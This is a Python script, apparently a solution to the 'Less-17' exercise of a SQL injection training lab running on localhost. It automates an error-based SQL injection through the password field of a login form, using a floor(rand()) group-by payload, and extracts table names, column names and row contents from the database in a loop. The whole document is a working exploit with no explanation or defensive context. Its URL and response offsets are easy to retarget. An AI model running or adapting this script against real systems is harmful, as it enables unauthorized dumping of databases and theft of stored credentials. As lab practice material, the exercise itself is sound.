import requests

get_table = "(select table_name from information_schema.tables where table_schema= database() limit {0},1)"
get_column = "(select column_name from information_schema.columns where table_name = '{0}' limit {1},1)"
get_secret = "(select {0} from {1} limit {2},1)"
url = "http://localhost:1234/Less-17/"
session = requests.Session()

payload="' or (select 1 from(select count(*),concat(0x3a,{},0x3a,floor(rand()*2))a from information_schema.tables group by a)b); #"
table=""
for i in range(4):
    find=get_table.format(i)
    response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
    temp=response.text[1392:1460]
    table=temp[temp.index(':')+1:temp.rindex(':')]
    column=""
    print("From Table",table,": ")
    for j in range(4):
        find=get_column.format(table,j)
        response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
        temp=response.text[1392:1460]
        if(':' in temp):
            column=temp[temp.index(':')+1:temp.rindex(':')]
            content=""
            print("Column",column," - ",end='')
            for k in range(10):
                find=get_secret.format(column,table,k)
                response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
                while('Subquery returns more than 1 row' in response.text):
                    response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
                temp=response.text[1392:1460]
                if(':' in temp):
                    content=temp[temp.index(':')+1:temp.rindex(':')]
                    print(content,end=",")
            print()
